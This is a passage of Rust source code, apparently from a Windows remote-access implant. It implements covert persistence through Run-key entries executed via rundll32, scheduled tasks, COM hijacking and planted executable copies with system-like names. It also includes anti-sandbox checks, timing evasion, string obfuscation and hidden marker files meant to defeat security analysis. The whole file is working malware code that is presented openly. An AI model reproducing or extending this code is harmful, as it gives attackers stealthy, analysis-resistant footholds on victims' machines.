    // Polymorphic registry value names
    let reg_names = [
        "NVDisplayContainer",
        "iTunesHelper",
        "SpotifyWebHelper",
        "DiscordUpdate",
    ];
    let idx = get_machine_index() % reg_names.len();
    let reg_name = reg_names[idx];
    
    // rundll32 with url.dll to execute our payload
    // FileProtocolHandler opens files/exes via file:// protocol
    let rundll_cmd = format!(
        r#"rundll32.exe url.dll,FileProtocolHandler "{}""#,
        exe_str
    );
    
    let reg_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();
    let reg_exe = obfstr!("reg").to_string();
    
    let output = Command::new(&reg_exe)
        .args(&["add", &reg_key, "/v", reg_name, "/t", "REG_SZ", "/d", &rundll_cmd, "/f"])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("LOLBAS rundll32 failed: {}", e))?;
    
    if output.status.success() {
        debug_print!("[LOLBAS] rundll32 persistence: {} -> {}", reg_name, exe_str);
        Ok(format!("LOLBAS rundll32: {}", reg_name))
    } else {
        Err(format!("rundll32 registry failed: {}", String::from_utf8_lossy(&output.stderr)))
    }
}

/// LOLBAS: certutil.exe persistence (via scheduled task)
/// Uses certutil.exe to copy/execute payload
///
/// **How it works**:
/// 1. Creates scheduled task with cmd.exe wrapper
/// 2. Uses certutil decode capability for obfuscation potential
/// 3. Primarily uses cmd start for actual execution
///
/// **Note**: certutil is commonly monitored, so we use it sparingly
#[cfg(target_os = "windows")]
fn persist_lolbas_certutil(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path.to_str().ok_or_else(|| "Invalid path".to_string())?;
    
    // Polymorphic task names
    let task_names = [
        "CertificateUpdateTask",
        "WindowsCertValidation",
        "RootCertSync",
        "CAUpdateService",
    ];
    let idx = get_machine_index() % task_names.len();
    let task_name = task_names[idx];
    
    // Use cmd.exe wrapper for execution
    // certutil alone is more for download/decode, not direct execution
    let task_cmd = format!(
        r#"cmd.exe /c start /min "" "{}""#,
        exe_str
    );
    
    let schtasks_exe = obfstr!("schtasks").to_string();
    
    // Delete existing task if present
    let _ = Command::new(&schtasks_exe)
        .args(&["/Delete", "/TN", task_name, "/F"])
        .creation_flags(0x08000000)
        .output();
    
    // Create task with ONLOGON trigger and random delay
    let delay_mins = 1 + (get_machine_index() % 5);
    let delay_str = format!("000{}:00", delay_mins);
    
    let output = Command::new(&schtasks_exe)
        .args(&[
            "/Create",
            "/SC", "ONLOGON",
            "/TN", task_name,
            "/TR", &task_cmd,
            "/F",
            "/RL", "LIMITED",
            "/DELAY", &delay_str,
        ])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("LOLBAS certutil task failed: {}", e))?;
    
    if output.status.success() {
        debug_print!("[LOLBAS] certutil persistence: {} -> {}", task_name, exe_str);
        Ok(format!("LOLBAS certutil: {} (delay {}min)", task_name, delay_mins))
    } else {
        Err(format!("Task creation failed: {}", String::from_utf8_lossy(&output.stderr)))
    }
}

// ============================================================================
// Environment Keying / Anti-Sandbox
// ============================================================================

/// Check if system looks like a real workstation vs sandbox
/// This prevents persistence in analysis environments
#[cfg(target_os = "windows")]
fn environment_check() -> bool {
    // Check 1: Minimum CPU cores (most sandboxes have 1)
    let cpus = std::thread::available_parallelism()
        .map(|p| p.get())
        .unwrap_or(1);
    if cpus < MIN_CPU_CORES {
        return false;
    }

    // Check 2: Uptime check - real systems have some uptime
    // Sandboxes are freshly booted
    let uptime_ms = unsafe { winapi::um::sysinfoapi::GetTickCount64() };
    if uptime_ms < MIN_UPTIME_MS {
        return false;
    }

    true
}

#[cfg(not(target_os = "windows"))]
fn environment_check() -> bool {
    true
}

/// Establece persistencia usando el método especificado
/// Includes environment keying to avoid sandbox detection
/// 
/// **Fileless methods**: For fileless persistence methods (registry shellcode, WMI memory exec, etc.),
/// this function will NOT copy files to disk. Instead, it uses in-memory techniques only.
pub fn establish_persistence(method: PersistenceMethod) -> Result<String, String> {
    #[cfg(not(target_os = "windows"))]
    {
        return Err("Windows only".to_string());
    }

    #[cfg(target_os = "windows")]
    {
        // Environment check - don't persist in sandboxes
        if !environment_check() {
            // Return success silently to not alert that sandbox was detected
            return Ok("OK".to_string());
        }

        // Small timing jitter before persistence operation
        let jitter_ms = 50 + (get_machine_index() % 100) as u64;
        std::thread::sleep(std::time::Duration::from_millis(jitter_ms));

        // Check if this is a fileless method
        if method.is_fileless() {
            // For fileless methods, delegate to persistence_fileless module
            use crate::persistence_fileless;
            
            debug_print!("[PERSIST] Using fileless persistence method: {:?}", method);
            
            // Convert to fileless method enum
            let fileless_method = match method {
                PersistenceMethod::RegistryShellcode => 
                    persistence_fileless::FilelessPersistenceMethod::RegistryShellcode,
                PersistenceMethod::WmiMemoryExec => 
                    persistence_fileless::FilelessPersistenceMethod::WmiMemoryExec,
                PersistenceMethod::ScheduledTaskDownload => 
                    persistence_fileless::FilelessPersistenceMethod::ScheduledTaskDownload,
                PersistenceMethod::BitsJobPersistence => 
                    persistence_fileless::FilelessPersistenceMethod::BitsJobPersistence,
                _ => unreachable!(),
            };
            
            // For fileless methods, we need shellcode or download URL
            // This would be provided by the C2 server or builder
            // For now, return an error indicating configuration is needed
            let config = persistence_fileless::FilelessConfig::default();
            
            return persistence_fileless::establish_fileless_persistence(fileless_method, &config);
        }
        
        // Check if this is a LOLBAS method
        if method.is_lolbas() {
            debug_print!("[PERSIST] Using LOLBAS persistence method: {:?}", method);
            
            // LOLBAS methods use LOLBins for execution
            // These methods copy the file but use trusted Windows binaries to execute
            let exe_path = get_current_exe_path()?;
            
            return match method {
                PersistenceMethod::MshtaLolbas => persist_lolbas_mshta(&exe_path),
                PersistenceMethod::Regsvr32Lolbas => persist_lolbas_regsvr32(&exe_path),
                PersistenceMethod::Rundll32Lolbas => persist_lolbas_rundll32(&exe_path),
                PersistenceMethod::CertutilLolbas => persist_lolbas_certutil(&exe_path),
                _ => unreachable!(),
            };
        }

        // Traditional (file-based) persistence methods
        // Obtener ruta en ubicación persistente
        let exe_path = get_current_exe_path()?;

        match method {
            PersistenceMethod::RegistryRun => persist_registry_run(&exe_path),
            PersistenceMethod::ScheduledTask => persist_scheduled_task(&exe_path),
            PersistenceMethod::WmiEvent => persist_wmi_event(&exe_path),
            PersistenceMethod::StartupFolder => persist_startup_folder(&exe_path),
            _ => Err("Method not supported in traditional persistence".to_string()),
        }
    }
}

/// Remueve persistencia (limpieza completa)
/// Now includes fileless persistence cleanup
#[cfg(target_os = "windows")]
pub fn remove_persistence() -> Result<String, String> {
    use std::fs;

    let reg_exe = obfstr!("reg").to_string();
    let schtasks_exe = obfstr!("schtasks").to_string();
    let ps_exe = obfstr!("powershell").to_string();
    let reg_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();

    // ====================================================================
    // FILELESS PERSISTENCE CLEANUP
    // ====================================================================
    
    use crate::persistence_fileless;
    let _ = persistence_fileless::remove_fileless_persistence();

    // ====================================================================
    // TRADITIONAL PERSISTENCE CLEANUP
    // ====================================================================

    // Registry Run - multiple possible names (including LOLBAS)
    let reg_names = [
        // Traditional persistence names
        "SecurityHealthSystray",
        "OneDriveSetup",
        "AdobeAAMUpdater",
        "GoogleChromeAutoLaunch",
        "MicrosoftEdgeAutoLaunch",
        "TeamsMachineInstaller",
        "NVDisplay.Container",
        "iTunesHelper",
        "Spotify",
        // LOLBAS forfiles names (was mshta)
        "WindowsFileCleanup",
        "DiskCleanupTask",
        "TempFileManager",
        "SystemFileMaintenance",
        // LOLBAS old mshta names (cleanup)
        "WindowsSecurityHealth",
        "OneDriveSyncManager",
        // LOLBAS regsvr32 names
        "MicrosoftEdgeUpdateS",
        "GoogleUpdateS",
        "OneDriveSyncS",
        "AdobeReaderS",
        // LOLBAS rundll32 names
        "NVDisplayContainer",
        "SpotifyWebHelper",
        "DiscordUpdate",
    ];
    for name in &reg_names {
        let _ = Command::new(&reg_exe)
            .args(&["delete", &reg_key, "/v", name, "/f"])
            .creation_flags(0x08000000)
            .output();
    }

    // Scheduled Tasks (including LOLBAS)
    let task_names = [
        // Traditional persistence names
        "MicrosoftEdgeUpdateTaskUser",
        "GoogleUpdateTaskUser",
        "OneDriveStandaloneUpdate",
        "Adobe Acrobat Update",
        "CCleaner Smart Cleaning",
        "NvTmRepOnLogon",
        "DropboxUpdate",
        "AdobeFlashPlayerUpdater",
        "CCleanerCrashReporting",
        // LOLBAS regsvr32 names
        "MicrosoftEdgeUpdateTaskUserS",
        "GoogleUpdateTaskUserS",
        "OneDriveStandaloneUpdateS",
        "AdobeAcrobatUpdateS",
        // LOLBAS certutil names
        "CertificateUpdateTask",
        "WindowsCertValidation",
        "RootCertSync",
        "CAUpdateService",
    ];
    for task in &task_names {
        let _ = Command::new(&schtasks_exe)
            .args(&["/Delete", "/TN", task, "/F"])
            .creation_flags(0x08000000)
            .output();
    }

    // COM Hijacking cleanup (legacy - keeping for backwards compatibility)
    // Remove COM CLSID entries that may have been created for persistence
    let com_clsids = [
        "{42aedc87-2188-41fd-b9a3-0c966feabec1}", // MruPidlList
        "{4EB61BAC-A3B6-4760-9581-655041EF4D69}", // EventSystem
        "{0F4B8AB8-FF9E-4C8C-B37F-5FA95A81F5C5}", // ThumbnailCache
        "{E6FE6494-4AE3-469D-B3F7-2FA40D8F1B62}", // WindowsSearchExt
    ];
    for clsid in &com_clsids {
        let reg_key = format!("HKCU\\Software\\Classes\\CLSID\\{}", clsid);
        let _ = Command::new(&reg_exe)
            .args(&["delete", &reg_key, "/f"])
            .creation_flags(0x08000000)
            .output();
    }
    
    // UserInitMprLogonScript cleanup (new WMI replacement)
    let env_key = obfstr!("HKCU\\Environment").to_string();
    let _ = Command::new(&reg_exe)
        .args(&["delete", &env_key, "/v", "UserInitMprLogonScript", "/f"])
        .creation_flags(0x08000000)
        .output();
    
    // RunOnce cleanup
    let runonce_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce").to_string();
    let runonce_names = ["SystemConfig", "UserSetup", "ProfileMigration"];
    for name in &runonce_names {
        let _ = Command::new(&reg_exe)
            .args(&["delete", &runonce_key, "/v", name, "/f"])
            .creation_flags(0x08000000)
            .output();
    }

    // Legacy WMI Events cleanup (for backwards compatibility)
    // This cleans up any old WMI persistence that may exist from previous versions
    let wmi_names = [
        "BfeOnServiceStateChange",
        "SystemTimeUpdate",
        "LocalTimeSync",
        "WindowsEventForwarder",
        "PerformanceMonitor",
        "SystemEventsBroker",
    ];
    let wmi_cleanup = format!(
        concat!(
            "$names=@('{}');",
            "foreach($n in $names){{",
            "Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \"Name='$n'\" -EA SilentlyContinue|Remove-WmiObject -EA SilentlyContinue;",
            "Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \"Name='$n'\" -EA SilentlyContinue|Remove-WmiObject -EA SilentlyContinue",
            "}};",
            "Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding -EA SilentlyContinue|",
            "Where-Object{{$_.Filter -match 'Bfe|Time|Forwarder|Performance|Events'}}|",
            "Remove-WmiObject -EA SilentlyContinue"
        ),
        wmi_names.join("','")
    );
    let _ = Command::new(&ps_exe)
        .args(&["-NoProfile", "-Command", &wmi_cleanup])
        .creation_flags(0x08000000)
        .output();

    // Startup shortcuts
    let appdata_key = obfstr!("APPDATA").to_string();
    let appdata = env::var(&appdata_key).unwrap_or_default();
    let lnk_names = [
        "WindowsSecurity.lnk",
        "OneDriveSync.lnk",
        "AdobeUpdater.lnk",
        "ChromeHelper.lnk",
        "EdgeUpdate.lnk",
    ];
    for lnk in &lnk_names {
        let lnk_path = format!(
            "{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{}",
            appdata, lnk
        );
        let _ = fs::remove_file(&lnk_path);
    }

    // Remove copied executables from stealth locations
    let localappdata_key = obfstr!("LOCALAPPDATA").to_string();
    let localappdata = env::var(&localappdata_key).unwrap_or_default();
    let exe_copies = [
        // New locations
        format!(
            "{}\\Microsoft\\Windows\\Explorer\\SearchIndexer.exe",
            localappdata
        ),
        format!(
            "{}\\Microsoft\\Windows\\Caches\\fontdrvhost.exe",
            localappdata
        ),
        format!(
            "{}\\Microsoft\\Windows\\WER\\ReportQueue\\RuntimeBroker.exe",
            localappdata
        ),
        format!(
            "{}\\Microsoft\\InputPersonalization\\TrainedDataStore\\ctfmon.exe",
            localappdata
        ),
        // New stealth locations (v2)
        format!(
            "{}\\Microsoft\\Windows\\Safety\\EppMigration\\SecurityHealthHost.exe",
            localappdata
        ),
        format!(
            "{}\\Microsoft\\Windows\\UpdateAssistant\\UpdateAssistant.exe",
            localappdata
        ),
        format!(
            "{}\\Microsoft\\EdgeUpdate\\Download\\MicrosoftEdgeUpdate.exe",
            localappdata
        ),
        format!(
            "{}\\Microsoft\\Windows\\WDI\\LogFiles\\DiagnosticsHub.StandardCollector.exe",
            localappdata
        ),
        // Legacy locations
        format!("{}\\Microsoft\\Windows\\Caches\\WmiPrvSE.exe", localappdata),
        format!(
            "{}\\Microsoft\\Windows\\WER\\ReportQueue\\conhost.exe",
            localappdata
        ),
        format!(
            "{}\\Microsoft\\OneDrive\\logs\\OneDriveStandaloneUpdater.exe",
            localappdata
        ),
        format!(
            "{}\\Microsoft\\Windows\\INetCache\\Low\\MoUsoCoreWorker.exe",
            localappdata
        ),
        format!(
            "{}\\Microsoft\\Edge\\User Data\\msedge_proxy.exe",
            localappdata
        ),
        format!(
            "{}\\Microsoft\\WindowsApps\\RuntimeBroker.exe",
            localappdata
        ),
        // Ultra-stealth locations (v3)
        format!(
            "{}\\Microsoft\\Windows\\DiagTrack\\Settings\\UtcSvc.exe",
            localappdata
        ),
        format!(
            "{}\\Microsoft\\Windows\\WER\\Temp\\WerFault.exe",
            localappdata
        ),
        format!(
            "{}\\Microsoft\\Windows\\Notifications\\wpndatabase\\WpnService.exe",
            localappdata
        ),
        format!(
            "{}\\Microsoft\\Windows\\ConnectedDevicesPlatform\\L.Admin\\CDPSvc.exe",
            localappdata
        ),
    ];
    for exe in &exe_copies {
        let _ = fs::remove_file(exe);
    }

    Ok("Persistence removed (all methods)".to_string())
}

#[cfg(not(target_os = "windows"))]
pub fn remove_persistence() -> Result<String, String> {
    Err("Windows only".to_string())
}

// ============================================================================
// Automatic Persistence with Evasion
// ============================================================================

#[cfg(target_os = "windows")]
use std::sync::atomic::{AtomicBool, Ordering};

/// Flag to track if automatic persistence has been established
/// Uses atomic bool for thread-safe access
#[cfg(target_os = "windows")]
static AUTO_PERSIST_DONE: AtomicBool = AtomicBool::new(false);

// Auto-persistence timing constants
#[cfg(target_os = "windows")]
const AUTO_PERSIST_BASE_DELAY_SECS: u64 = 180; // 3 minutes base delay
#[cfg(target_os = "windows")]
const AUTO_PERSIST_JITTER_MAX: usize = 120; // Max jitter in seconds (0-120)
#[cfg(target_os = "windows")]
const AUTO_PERSIST_CHUNK_SECS: u64 = 30; // Sleep chunk size in seconds
#[cfg(target_os = "windows")]
const AUTO_PERSIST_TIME_ACCEL_THRESHOLD: u64 = 25; // If sleep < this, time acceleration detected
                                                   // Use MIN_UPTIME_MS (3 min) for the final check since by the time auto-persistence runs,
                                                   // we've already waited 3-5 minutes, so the system has been up long enough if it passed
                                                   // the initial environment checks. 10 minutes was too restrictive for VM testing.

/// Marker file to check if persistence was already established in a previous run
#[cfg(target_os = "windows")]
fn get_persistence_marker_path() -> PathBuf {
    let localappdata = env::var(obfstr!("LOCALAPPDATA").to_string())
        .unwrap_or_else(|_| "C:\\Users\\Public".to_string());
    PathBuf::from(format!(
        "{}\\Microsoft\\Windows\\Caches\\{}.dat",
        localappdata,
        obfstr!("syscache")
    ))
}

/// Check if persistence marker exists (already persisted in previous run)
#[cfg(target_os = "windows")]
fn persistence_marker_exists() -> bool {
    get_persistence_marker_path().exists()
}

/// Create persistence marker file
#[cfg(target_os = "windows")]
fn create_persistence_marker() {
    use std::fs;
    let marker_path = get_persistence_marker_path();

    // Create parent directory if needed
    if let Some(parent) = marker_path.parent() {
        let _ = fs::create_dir_all(parent);
    }

    // Write marker with some random-looking data
    let marker_data = format!(
        "{}{}{}",
        std::process::id(),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs(),
        get_machine_index()
    );
    let _ = fs::write(&marker_path, marker_data.as_bytes());

    // Set hidden attribute
    let attrib_exe = obfstr!("attrib").to_string();
    let _ = Command::new(&attrib_exe)
        .args(&["+h", "+s", marker_path.to_str().unwrap_or("")])
        .creation_flags(0x08000000)
        .output();
}

/// Schedule automatic persistence to be established after a delay
/// This runs in a background thread and uses timing jitter for evasion
///
/// Features:
/// - Random delay between 3-5 minutes (anti-behavioral)
/// - Uses registry persistence (most reliable, no UAC)
/// - Marker file to avoid re-persisting on each run
/// - Environment keying (anti-sandbox)
/// - Indirect syscalls for memory operations (if available)
#[cfg(target_os = "windows")]
pub fn schedule_auto_persistence() {
    use std::thread;

    // Check if already done in this session
    if AUTO_PERSIST_DONE.load(Ordering::SeqCst) {
        debug_print!("DEBUG: [AUTO-PERSIST] Already done in this session, skipping");
        return;
    }

    // Check if marker exists (persisted in previous run)
    if persistence_marker_exists() {
        debug_print!("DEBUG: [AUTO-PERSIST] Marker file exists, already persisted in previous run");
        AUTO_PERSIST_DONE.store(true, Ordering::SeqCst);
        return;
    }

    // Spawn background thread for auto-persistence
    thread::spawn(|| {
        // ====================================================================
        // TIMING EVASION: Random delay 3-5 minutes with jitter
        // ====================================================================
        // This evades sandboxes that:
        // 1. Only analyze for short periods (< 3 min)
        // 2. Accelerate time (we use real-time checks)
        // 3. Look for immediate persistence behavior

        let jitter_secs = get_machine_index() % AUTO_PERSIST_JITTER_MAX;
        let total_delay = AUTO_PERSIST_BASE_DELAY_SECS + jitter_secs as u64;

        debug_print!(
            "DEBUG: [AUTO-PERSIST] Starting with {}s delay ({}s base + {}s jitter)",
            total_delay,
            AUTO_PERSIST_BASE_DELAY_SECS,
            jitter_secs
        );

        // Sleep in chunks to avoid detection of long sleep calls
        // Some sandboxes hook Sleep() and fast-forward
        let chunks = total_delay / AUTO_PERSIST_CHUNK_SECS;
        let remainder = total_delay % AUTO_PERSIST_CHUNK_SECS;

        for chunk_num in 0..chunks {
            // Use real-time validation between chunks
            let start = std::time::Instant::now();
            std::thread::sleep(std::time::Duration::from_secs(AUTO_PERSIST_CHUNK_SECS));

            let elapsed = start.elapsed().as_secs();
            debug_print!(
                "DEBUG: [AUTO-PERSIST] Sleep chunk {}/{} completed ({}s elapsed)",
                chunk_num + 1,
                chunks,
                elapsed
            );

            // Anti-time-acceleration check: if sleep completed too fast,
            // sandbox might be accelerating time - abort
            if elapsed < AUTO_PERSIST_TIME_ACCEL_THRESHOLD {
                debug_print!(
                    "DEBUG: [AUTO-PERSIST] ❌ Time acceleration detected ({}s < {}s threshold), aborting",
                    elapsed,
                    AUTO_PERSIST_TIME_ACCEL_THRESHOLD
                );
                return; // Time acceleration detected, abort persistence
            }
        }

        if remainder > 0 {
            debug_print!("DEBUG: [AUTO-PERSIST] Sleeping remainder {}s", remainder);
            std::thread::sleep(std::time::Duration::from_secs(remainder));
        }

        debug_print!("DEBUG: [AUTO-PERSIST] Delay complete, running environment checks...");

        // ====================================================================
        // ENVIRONMENT KEYING: Additional sandbox checks before persistence
        // ====================================================================
        if !environment_check() {
            debug_print!("DEBUG: [AUTO-PERSIST] ❌ Environment check failed, aborting");
            return; // Sandbox detected, abort silently
        }

        debug_print!("DEBUG: [AUTO-PERSIST] ✅ Environment check passed");

        // Additional check: system uptime should be at least 3 minutes
        // By this point we've already waited 3-5 minutes, so this is a sanity check
        let uptime_ms = unsafe { winapi::um::sysinfoapi::GetTickCount64() };
        if uptime_ms < MIN_UPTIME_MS {
            debug_print!(
                "DEBUG: [AUTO-PERSIST] ❌ Uptime too low ({}ms < {}ms), aborting",
                uptime_ms,
                MIN_UPTIME_MS
            );
            return; // Freshly booted system, likely sandbox
        }

        debug_print!(
            "DEBUG: [AUTO-PERSIST] ✅ Uptime check passed ({}ms)",
            uptime_ms
        );

        // ====================================================================
        // ULTRA-STEALTH AUTO-PERSISTENCE
        // ====================================================================
        // This uses the most undetectable persistence method available.
        // Priority order (from most to least stealthy):
        // 1. COM Hijacking - Very stealthy, no PowerShell, no obvious registry keys
        // 2. Registry Run with explorer.exe - Common pattern, blends in
        //
        // Key evasion features:
        // - Timestomping makes binary appear 6-12 months old
        // - File hidden in deep Windows folders that mimic system files
        // - Uses indirect syscalls where possible
        // - No PowerShell or scripting engines used
        // - Random jitter in all operations

        debug_print!("DEBUG: [AUTO-PERSIST] Establishing ultra-stealth persistence...");

        // Mark as done first to prevent race conditions
        AUTO_PERSIST_DONE.store(true, Ordering::SeqCst);

        // Try COM Hijacking first (most stealthy)
        // Note: WmiEvent enum now implements COM Hijacking (not actual WMI)
        // The enum name is kept for backwards compatibility with "persistence wmi" command
        match establish_persistence(PersistenceMethod::WmiEvent) {
            Ok(msg) => {
                debug_print!(
                    "DEBUG: [AUTO-PERSIST] ✅ COM Hijacking established: {}",
                    msg
                );
                // Create marker to avoid re-persisting on next run
                create_persistence_marker();
                debug_print!("DEBUG: [AUTO-PERSIST] ✅ Marker file created");
                return;
            }
            Err(e) => {
                debug_print!(
                    "DEBUG: [AUTO-PERSIST] ⚠️ COM Hijacking failed: {}, trying fallback...",
                    e
                );
            }
        }

        // Fallback to Registry Run (still stealthy with explorer.exe)
        match establish_persistence(PersistenceMethod::RegistryRun) {
            Ok(msg) => {
                debug_print!(
                    "DEBUG: [AUTO-PERSIST] ✅ Registry persistence established: {}",
                    msg
                );
                create_persistence_marker();
                debug_print!("DEBUG: [AUTO-PERSIST] ✅ Marker file created");
            }
            Err(e) => {
                debug_print!(
                    "DEBUG: [AUTO-PERSIST] ❌ Failed to establish persistence: {}",
                    e
                );
            }
        }
    });
}

/// Dummy implementation for non-Windows
#[cfg(not(target_os = "windows"))]
pub fn schedule_auto_persistence() {
    // No-op on non-Windows
}

// ============================================================================
// Indirect Syscall Support
// ============================================================================
// The actual indirect syscall implementations are in syscalls.rs
// Here we just re-export the availability check for use in this module

/// Check if indirect syscalls are available
/// Re-exports the check from syscalls module
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub fn is_indirect_syscall_available() -> bool {
    crate::syscalls::is_indirect_syscall_available()
}
